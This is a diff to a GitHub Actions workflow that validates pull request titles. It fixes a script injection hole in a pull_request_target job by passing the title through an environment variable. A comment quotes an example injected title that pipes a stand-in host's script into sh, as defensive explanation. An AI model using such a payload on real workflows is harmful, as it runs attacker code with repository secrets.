@@ -4,20 +4,37 @@ on:
   pull_request_target:
     types: [opened, edited, synchronize]
 
+permissions:
+  contents: read
+
 jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
       - name: Validate PR title format
         id: validate
+        # The title is attacker-controlled — anyone who can open a PR, including
+        # from a fork, chooses this string. It MUST arrive as an environment
+        # variable rather than being interpolated into the script body: this
+        # workflow runs on `pull_request_target`, which executes with the base
+        # repository's secrets and a write-scoped token, so a title such as
+        #   x"; curl evil.sh | sh; "
+        # would previously have broken out of the assignment and run in that
+        # privileged context. With `env:` the value is never part of the script
+        # text, so quoting is all that is needed.
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
         run: |
-          TITLE="${{ github.event.pull_request.title }}"
+          TITLE="$PR_TITLE"
           echo "PR title: $TITLE"
-          
-          # Check if title already matches strict format (lowercase type with colon)
-          if echo "$TITLE" | grep -qE '^(feat|fix|docs|style|refactor|perf|test|build|ci|chore|revert):\s+.+'; then
+
+          # Check if title already matches strict format (lowercase type with colon).
+          # The optional (scope) group is part of the Conventional Commits spec —
+          # `type(scope): description`. Without it this check rejected every
+          # scoped title in the repo's own history, e.g. feat(reader): and fix(ci):.
+          if echo "$TITLE" | grep -qE '^(feat|fix|docs|style|refactor|perf|test|build|ci|chore|revert)(\([a-zA-Z0-9 ,._/-]+\))?!?:\s+.+'; then
             echo "✅ PR title already matches strict conventional commit format"
-            echo "strict_format=true" >> $GITHUB_OUTPUT
+            echo "strict_format=true" >> "$GITHUB_OUTPUT"
             exit 0
           fi
           
@@ -31,7 +48,7 @@ jobs:
           echo "Normalized: $NORMALIZED"
           
           # Check if normalized title matches conventional commit format
-          if echo "$NORMALIZED" | grep -qE '^(feat|fix|docs|style|refactor|perf|test|build|ci|chore|revert):\s+.+'; then
+          if echo "$NORMALIZED" | grep -qE '^(feat|fix|docs|style|refactor|perf|test|build|ci|chore|revert)(\([a-zA-Z0-9 ,._/-]+\))?!?:\s+.+'; then
             echo "✅ PR title is valid (after normalization)"
             echo ""
             echo "Accepted formats:"
@@ -41,7 +58,7 @@ jobs:
             echo "  - fix: description"
             echo ""
             echo "Note: Your title was normalized from \"$TITLE\" to \"$NORMALIZED\""
-            echo "strict_format=false" >> $GITHUB_OUTPUT
+            echo "strict_format=false" >> "$GITHUB_OUTPUT"
             exit 0
           else
             echo "❌ PR title does not match conventional commit format"
@@ -71,5 +88,3 @@ jobs:
             echo "Normalized: \"$NORMALIZED\""
             exit 1
           fi
-
-
